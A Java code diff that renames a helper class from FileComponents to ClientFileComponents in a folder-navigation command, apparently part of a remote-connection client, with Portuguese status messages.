@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.file.navigation;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
 
 import java.io.File;
 
@@ -25,22 +25,22 @@ public class ClientCommandEnterFolder extends ClientCommand {
             return;
         }
         if (input.equalsIgnoreCase("..")) {
-            File access = new File(FileComponents.FOLDER).getParentFile();
+            File access = new File(ClientFileComponents.FOLDER).getParentFile();
             if (access == null) {
                 msg("Não foi possível acessar uma pasta anterior!");
                 return;
             }
-            FileComponents.FOLDER = access.getAbsolutePath();
+            ClientFileComponents.FOLDER = access.getAbsolutePath();
             msg("Acessado: " + access.getAbsolutePath());
             return;
         }
-        File file = FileComponents.file(input);
+        File file = ClientFileComponents.file(input);
         if (!file.exists()) {
             msg("Pasta não encontrada!");
             return;
         }
         if (file.isDirectory() && file.listFiles() != null) {
-            FileComponents.FOLDER = file.getAbsolutePath();
+            ClientFileComponents.FOLDER = file.getAbsolutePath();
             msg("Acessado: " + file.getAbsolutePath());
         } else {
             msg("Não é possível acessar esta pasta!");
